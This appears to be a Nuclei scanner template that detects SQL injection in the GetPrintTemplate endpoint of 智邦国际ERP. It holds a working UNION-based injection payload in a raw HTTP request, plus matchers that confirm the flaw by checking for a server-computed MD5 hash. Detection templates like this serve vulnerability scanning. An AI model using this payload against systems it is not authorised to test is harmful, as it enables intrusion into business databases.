id: zbintel-erp-getprinttemplate-sqli
info:
  name: 智邦国际ERP GetPrintTemplate SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  metadata:
    vendor: 智邦国际ERP

variables:
  t1: "{{rand_int(1000, 10000)}}"
  t2: "{{md5(t1)}}"

http:
  - raw:
      - |
        GET /SYSN/json/pcclient/GetPrintTemplate.ashx?sort=1&ord=-1+UNION+ALL+SELECT+NULL,sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}')),NULL,NULL,NULL--+vlPx HTTP/1.1
        Host: {{Hostname}}
        Accept: application/json
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "转换成数据类型"
          - "SQL"
          - "0x{{t2}}"
        part: body
      - type: word
        words:
          - "application/json"
        part: header
